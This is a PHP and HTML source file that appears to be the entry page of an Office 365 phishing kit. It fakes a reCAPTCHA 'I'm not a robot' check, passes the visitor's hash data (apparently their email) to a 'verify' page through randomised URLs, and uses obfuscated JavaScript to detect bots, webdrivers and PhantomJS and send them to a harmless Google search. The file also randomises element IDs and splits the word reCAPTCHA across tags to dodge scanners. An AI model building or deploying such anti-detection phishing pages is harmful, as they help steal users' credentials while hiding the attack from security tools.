<?php

include "boblock.php";
function RndString($length = 10)
{
    return substr(str_shuffle("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"), 0, $length);
}
$rndString3 = RndString(6);
$randpart = $randfirstpart . '' . RndString(8) . "-" . RndString(4) . "-" . RndString(4) . "-" . RndString(4) . "-" . RndString(12) . "_" . RndString(50) . '' . RndString(50) . '' . RndString(50);
if (!isset($_SESSION["title"])) {
    $CurrentTitle = $_SESSION["title"] = $TitlesArray[array_rand($TitlesArray)];
} else {
    $CurrentTitle = $_SESSION["title"];
}
if ($_POST) {
    $Return = getCaptcha($_POST["g-recaptcha-response"]);
    if ($Return->success == true) {
        $_SESSION["g-recaptcha-response"] = true;
        echo "<script>\n                window.location.href = \"verify?" . $randpart . "&data=" . $_POST["data"] . "\"\n              </script>";
    } else {
        $_SESSION["g-recaptcha-response"] = false;
        die(header("Location: " . $FailRedirect));
    }
}
?>
<!doctype html>
<html class=""dir="ltr"lang="en">
  <head>
    <meta content="text/html; charset=utf-8"http-equiv="Content-Type">
    <title>Verification
    </title>
    <meta content="IE=edge"http-equiv="X-UA-Compatible">
    <meta content="width=device-width,initial-scale=1,maximum-scale=2,user-scalable=yes"name="viewport">
    <meta content="no-cache"http-equiv="Pragma">
    <meta content="-1"http-equiv="Expires">
    <meta content="no-referrer"name="referrer">
    <meta content="none"name="robots">
    <script>function _0x2030(t,n){
        var r=_0x322d();
        return(_0x2030=function(t,n){
          return r[t-=176]}
              )(t,n)}
      function isBot(){
        var t=_0x2030;
        return navigator.mimeTypes[t(176)]+navigator.plugins[t(176)]==0||(1==navigator.webdriver||(!!window.document[t(183)].getAttribute(t(190))||!(!window[t(192)]&&!window[t(182)])))}
      function _0x322d(){
        var t=["100vYkcDf","1146BgEpsa","7930020aWoyNL","6xBjjQW","webdriver","17037JECFtk","callPhantom","length","584rIHfWE","231411hVqpAN","141493sOgOGS","222090mENIGe","788BfQcxK","_phantom","documentElement","2247798RMRRpw","2CrpWKx"];
        return(_0x322d=function(){
          return t}
              )()}
      !function(t,n){
        for(var r=_0x2030,e=_0x322d();;)try{
          if(184641==parseInt(r(178))/1*(parseInt(r(185))/2)+-parseInt(r(187))/3*(parseInt(r(181))/4)+parseInt(r(180))/5*(-parseInt(r(189))/6)+-parseInt(r(184))/7+parseInt(r(177))/8*(-parseInt(r(191))/9)+-parseInt(r(186))/10*(parseInt(r(179))/11)+parseInt(r(188))/12)break;
          e.push(e.shift())}
        catch(t){
          e.push(e.shift())}
      }
      (),bot=isBot(),bot&&Array.from(document.getElementsByTagName("a")).forEach(function(t){
        t.href="https://www.google.com/search?q=office365"})
        </script>
    <noscript>
      <meta content="0; URL=./"http-equiv="Refresh">
    </noscript>
    <link href="images/favicon.ico"rel="icon"type="image/x-icon">
    <script src="https://www.google.com/recaptcha/api.js?render=<?php echo "SITE_KEY";?>">
    </script>
    <style>.grecaptcha-badge{
      opacity:0}
      .captcha{
        background-color:#f9f9f9;
        border:1px solid #99979763;
        border-radius:3px;
        color:#4c4a4b;
        display:flex;
        justify-content:center;
        align-items:center;
        height:78px;
        width:283px}
      .text{
        font-size:1.75em;
        font-weight:500;
        margin-right:1em}
      .spinner{
        position:relative;
        width:2em;
        height:2em;
        display:flex;
        margin:2em 1em;
        align-items:center;
        justify-content:center}
      input[type=checkbox]{
        position:absolute;
        opacity:0;
        z-index:-1}
      input[type=checkbox]+.checkmark{
        display:inline-block;
        width:2em;
        height:2em;
        background-color:#fcfcfc;
        border:2.5px solid #c3c3c3;
        border-radius:3px;
        display:flex;
        justify-content:center;
        align-items:center;
        cursor:pointer}
      input[type=checkbox]+.checkmark span{
        content:'';
        position:relative;
        margin-top:-3px;
        transform:rotate(45deg);
        width:.75em;
        height:1.2em;
        opacity:0}
      input[type=checkbox]+.checkmark>span:after{
        content:'';
        position:absolute;
        display:block;
        height:3px;
        bottom:0;
        left:0;
        background-color:#029f56}
      input[type=checkbox]+.checkmark>span:before{
        content:'';
        position:absolute;
        display:block;
        width:3px;
        bottom:0;
        right:0;
        background-color:#029f56}
      input[type=checkbox]:checked+.checkmark{
        animation:2s spin forwards}
      input[type=checkbox]:checked+.checkmark>span{
        animation:1s fadein 1.9s forwards}
      input[type=checkbox]:checked+.checkmark>span:after{
        animation:.3s bottomslide 2s forwards}
      input[type=checkbox]:checked+.checkmark>span:before{
        animation:.5s rightslide 2.2s forwards}
      @keyframes fadein{
        0%{
          opacity:0}
        100%{
          opacity:1}
      }
      @keyframes bottomslide{
        0%{
          width:0}
        100%{
          width:100%}
      }
      @keyframes rightslide{
        0%{
          height:0}
        100%{
          height:100%}
      }
      .logo{
        display:flex;
        flex-direction:column;
        align-items:center;
        height:78%;
        align-self:flex-end;
        margin:.5em 1em}
      .logo img{
        height:2em;
        width:2em}
      .logo p{
        color:#9d9ba7;
        margin:0;
        font-size:10px;
        font-weight:400;
        margin:.4em 0 .2em 0}
      .logo small{
        color:#9d9ba7;
        margin:0;
        font-size:.7em}
      @keyframes spin{
        10%{
          width:0;
          height:0;
          border-width:6px}
        30%{
          width:0;
          height:0;
          border-radius:50%;
          border-width:1em;
          transform:rotate(0);
          border-color:#c7daf5}
        50%{
          width:2em;
          height:2em;
          border-radius:50%;
          border-width:4px;
          border-color:#c7daf5;
          border-right-color:#5998ef}
        70%{
          border-width:4px;
          border-color:#c7daf5;
          border-right-color:#5998ef}
        90%{
          border-width:4px}
        100%{
          width:2em;
          height:2em;
          border-radius:50%;
          transform:rotate(720deg);
          border-color:transparent}
      }
      ::selection{
        background-color:transparent;
        color:teal}
      ::-moz-selection{
        background-color:transparent;
        color:teal}
    </style>
  </head>
  <body>
    <center>
      <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
      <div class="captcha"id="<?php echo RndString(6);?>">
        <div class="spinner"id="<?php echo RndString(6);?>">
          <label for="myCheck"id="<?php echo RndString(6);?>">
            <form action=""id="<?php echo $rndString3;?> "method="POST">
              <input id="data"type="hidden"name="data"> 
              <input id="g-recaptcha-response"type="hidden"name="g-recaptcha-response"> 
              <input id="myCheck"type="checkbox"onchange="this.form.submit()"> 
                <span class="checkmark"id="<?php echo RndString(10);?>">
                    <span></span>
                </span>
            </form>
          </label>
        </div>
        <div>I'm not a robot</div>
        <div class="logo">
          <img id="<?php echo RndString(11);?> "src="images/capt.png">
            <p id="<?php echo RndString(11);?>">re
                <a id="<?php echo RndString(10);?>">CA
                <a id="<?php echo RndString(10);?>">PTC
                <a id="<?php echo RndString(10);?>">HA
            </p>
            <small>Privacy - Terms</small>
        </div>
      </div>
    </center>
    <script>grecaptcha.ready(function(){
        grecaptcha.execute("<?php echo "SITE_KEY";?>",{action:"verify"}).then(function(e){document.getElementById("g-recaptcha-response").value=e,document.getElementById("data").value=location.hash.substr(1)})})
    </script>
  </body>
</html>
